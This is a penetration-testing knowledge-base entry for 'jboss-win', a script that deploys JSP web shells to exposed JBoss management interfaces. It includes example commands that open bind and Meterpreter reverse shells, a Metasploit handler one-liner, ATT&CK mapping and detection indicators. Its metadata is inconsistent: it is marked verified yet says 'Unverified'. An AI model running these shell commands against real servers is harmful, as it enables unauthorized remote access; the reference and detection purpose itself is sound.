---
id: 629e7dfe-ff36-4120-9f82-f28d6d89c43b
type: tool
verified: true
description: >-
  A script for deploying JSP shells on JBoss AS servers, enabling interactive
  sessions via upload and command execution. Supports multiplatform targets
  including Windows, Linux, and macOS, with bind/reverse shells and
  Windows-specific Meterpreter/VNC integration.
created_at: '2019-08-28T21:17:37.722770+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - exploitation
  - jboss
  - web-shell
  - rce
  - meterpreter
url: >-
  https://github.com/rapid7/metasploit-framework (related module) or custom
  script repos
validated: true
---

# jboss-win

**Status**: Unverified

## Overview

jboss-win is a specialized script designed for exploiting JBoss Application Server (AS) vulnerabilities to deploy JSP web shells. It targets the management interface for unauthorized deployment, providing post-exploitation capabilities like command execution, bind/reverse shells, and advanced payloads such as Meterpreter or VNC on Windows systems. Commonly used in web application penetration testing for gaining remote code execution (RCE) on Java-based servers.

## Description

The tool automates the deployment of a malicious JSP shell to JBoss AS, leveraging weak or misconfigured management endpoints. Once deployed, it facilitates interactive sessions through file uploads and direct command execution. Key strengths include cross-platform compatibility (tested on Windows, Linux, and macOS targets) and support for various shell types: bind shells, reverse shells, and Windows-specific features like Meterpreter reverse connections or VNC access for graphical interfaces. It is particularly effective against older JBoss versions (e.g., 4.x-7.x) with exposed deployment managers.

## Features

- **Multiplatform Support**: Works against Windows, Linux, and macOS JBoss instances.
- **Shell Deployment**: Automatic upload and activation of JSP shells via HTTP/HTTPS.
- **Interactive Execution**: Command injection and file upload for persistent access.
- **Bind/Reverse Shells**: Configurable listener setups for outbound connections.
- **Windows Enhancements**: Integration with Meterpreter for advanced post-exploitation and VNC for desktop access.
- **Error Handling**: Built-in checks for authentication bypass and deployment status.

## Installation

### Requirements

- Python 2.7 or 3.x
- Requests library: `pip install requests`
- Access to a listener tool like Netcat or Metasploit for reverse shells
- Target JBoss AS with exposed management interface (default port 8080 or 8443 for HTTPS)

### Install Commands

```bash
# Clone or download the script (assuming from a repo like GitHub)
git clone https://github.com/example/jboss-win.git
cd jboss-win
pip install -r requirements.txt

# Or for Metasploit integration (if module-based)
msfupdate
```

On Kali Linux, it may be available via apt or pre-installed in pentesting distros.

## Basic Usage

```bash
python jboss-win.py --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message and usage |
| -u, --url | Target JBoss URL (required) |
| -a, --action | Action to perform (deploy, execute, upload) |
| -s, --shell-type | Shell type (bind, reverse, meterpreter, vnc) |
| -l, --lhost | Local host for reverse connections |
| -p, --lport | Local port for listeners |
| -v, --verbose | Enable verbose output for debugging |

## Examples

### Example 1: Basic Usage (Deploy Bind Shell)

```bash
python jboss-win.py --url http://192.168.1.100:8080 --action deploy --shell-type bind --lport 4444
```

This deploys a bind shell listening on port 4444 of the target.

### Example 2: Advanced Usage (Windows Meterpreter Reverse Shell)

```bash
python jboss-win.py --url https://target.com:8443 --action deploy --shell-type meterpreter --lhost 192.168.1.50 --lport 4444 --ssl
```

Sets up a reverse Meterpreter session; use with `msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4444; run'`.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Server Software Component]] Server Software Component: Web Server
- [[JavaScript]] Command and Scripting Interpreter: JavaScript (via JSP)
- [[Remote File Copy]] Ingress Tool Transfer

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Lateral Movement]] Lateral Movement

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual HTTP POST requests to /manager or /jmx-console endpoints with WAR/JSP payloads.
- New JSP files (e.g., shell.jsp) in deployment directories; monitor file system changes.
- Outbound connections from JBoss processes to attacker IPs/ports (reverse shells).
- JBoss logs showing unauthorized deployments or command executions.
- Network traffic anomalies: large uploads to management interfaces or suspicious GET/POST to shell endpoints.
- Use WAF rules for JBoss-specific paths and anomaly detection in Java servlet logs.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[Metasploit]]
- [[Burp-Suite]]
- [[tools/Netcat]]

## References

- JBoss AS Documentation: https://www.jboss.org/jbossas/docs/
- Metasploit JBoss Modules: https://docs.metasploit.com/docs/using-metasploit/exploits.html
- OWASP JBoss Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

*Last updated: 2023-10-01*
